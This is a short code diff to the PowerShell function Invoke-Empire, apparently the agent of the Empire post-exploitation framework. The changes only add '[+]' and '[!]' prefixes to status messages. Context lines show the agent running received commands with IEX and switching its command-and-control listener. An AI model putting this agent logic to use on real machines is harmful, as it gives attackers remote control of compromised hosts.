@@ -1027,11 +1027,11 @@ function Invoke-Empire {
                 try {
                     IEX $data
 
-                    Encode-Packet -type $type -data ($CurrentListenerName) -ResultID $ResultID
+                    Encode-Packet -type $type -data "[+] Switched the current listener to: $CurrentListenerName" -ResultID $ResultID
                 }
                 catch {
                     
-                    Encode-Packet -type 0 -data ("Unable to update agent comm methods: $_") -ResultID $ResultID
+                    Encode-Packet -type 0 -data ("[!] Unable to update agent comm methods: $_") -ResultID $ResultID
                 }
             }
 
@@ -1039,15 +1039,15 @@ function Invoke-Empire {
                 # Update the listener name variable
                 $script:CurrentListenerName = $data
 
-                Encode-Packet -type $type -data ("Updated the CurrentListenerName to: $CurrentListenerName") -ResultID $ResultID
+                Encode-Packet -type $type -data "[+] Updated the CurrentListenerName to: $CurrentListenerName" -ResultID $ResultID
             }
 
             else{
-                Encode-Packet -type 0 -data "invalid type: $type" -ResultID $ResultID
+                Encode-Packet -type 0 -data "[!] invalid type: $type" -ResultID $ResultID
             }
         }
         catch [System.Exception] {
-            Encode-Packet -type $type -data "error running command: $_" -ResultID $ResultID
+            Encode-Packet -type $type -data "[!] error running command: $_" -ResultID $ResultID
         }
     }
 
